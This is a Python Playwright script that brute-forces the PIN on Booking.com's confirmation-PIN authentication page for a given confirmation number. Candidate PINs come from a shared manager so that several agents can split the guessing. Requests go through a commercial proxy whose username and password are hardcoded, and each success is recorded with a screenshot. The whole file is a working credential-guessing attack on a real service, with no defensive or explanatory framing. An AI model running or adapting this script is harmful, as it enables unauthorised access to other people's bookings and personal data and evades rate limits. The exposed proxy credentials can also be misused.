from playwright.sync_api import sync_playwright
import os
import time
import argparse
from multi_pin_manager import PinManager

# --- Configurable parameters ---
parser = argparse.ArgumentParser(description="Booking.com PIN tester")
parser.add_argument('--confirmation', type=str, default="6339614781", help='Confirmation number')
parser.add_argument('--pins', type=str, default="1,2,3,4", help='Comma-separated PINs')
parser.add_argument('--wait', type=int, default=15, help='Wait time between attempts (seconds)')
parser.add_argument('--headless', action='store_true', help='Run browser in headless mode')
args = parser.parse_args()

CONFIRMATION = args.confirmation
WAIT_TIME = args.wait
HEADLESS = False  # Always show browser
SCREEN_DIR = "screenshots"
AGENT_NAME = "3W"

# Get PIN manager and PINs
pin_mgr = PinManager(CONFIRMATION)
PINS = []
for _ in range(5):
    pin = pin_mgr.get_next_pin(AGENT_NAME)
    if pin:
        PINS.append(pin)

# --- Proxy configuration ---
PROXY_CONFIG = {
    "server": "http://pr.oxylabs.io:7777",
    "username": "customer-1proxylabs_atNPR-cc-us",
    "password": "1proxylabs_atNPR1"
}

os.makedirs(SCREEN_DIR, exist_ok=True)

def log_result(pin, result, url):
    pin_mgr.record_result(AGENT_NAME, pin, result)

# Check if success already found
if pin_mgr.get_success_pin():
    print(f"Success already found! PIN: {pin_mgr.get_success_pin()}")
    exit(0)

if not PINS:
    print("No available PINs to try or all PINs exhausted")
    exit(1)

print(f"Agent {AGENT_NAME} will try these PINs: {PINS}")

success_count = 0
fail_count = 0
unknown_count = 0
exception_count = 0

with sync_playwright() as p:
    browser = p.chromium.launch(headless=HEADLESS, proxy=PROXY_CONFIG)
    page = browser.new_page()

    for pin in PINS:
        print(f"\n Please fill the form manually for PIN: {pin}")
        page.goto("https://secure.booking.com/help/confirmation_pin_auth", wait_until="load")

        try:
            # Wait for the confirmation number input using placeholder
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=15000)
            page.fill('input[placeholder="e.g. 1234567890"]', CONFIRMATION)
            page.fill('input[placeholder="e.g. 1234"]', pin)

            # Wait for the Continue button to be visible, then click
            try:
                page.wait_for_selector('button:has-text("Continue")', timeout=5000)
                page.click('button:has-text("Continue")')
            except Exception:
                page.wait_for_selector('button[type="submit"]', timeout=5000)
                page.click('button[type="submit"]')

            # Now wait for either result: success or error banner
            page.wait_for_function(
                """
                () => {
                    return location.href.includes('unique_order_id') ||
                           document.querySelector('.bui-alert--error') !== null
                }
                """,
                timeout=45000  # only if nothing happens at all in 45s
            )

            current_url = page.url
            if "unique_order_id=" in current_url:
                print(f" PIN FOUND | URL: {current_url}")
                page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_success.png")
                log_result(pin, "SUCCESS", current_url)
                success_count += 1
                break
            elif page.query_selector('.bui-alert--error'):
                print(f" Incorrect PIN (as detected after manual submit)")
                page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_fail.png")
                log_result(pin, "FAILURE", current_url)
                fail_count += 1
            else:
                print(f" Unknown result for PIN (after manual submit)")
                page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_unknown.png")
                log_result(pin, "UNKNOWN", current_url)
                unknown_count += 1

        except Exception as e:
            print(f" Error: {e}")
            page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_exception.png")
            log_result(pin, "EXCEPTION", page.url)
            exception_count += 1

        print(f" Waiting {WAIT_TIME}s before next...")
        page.wait_for_timeout(WAIT_TIME * 1000)

    browser.close()

print("\n--- Summary Report ---")
print(f"Total attempts: {len(PINS)}")
print(f"Success: {success_count}")
print(f"Failure: {fail_count}")
print(f"Unknown: {unknown_count}")
print(f"Exception: {exception_count}")
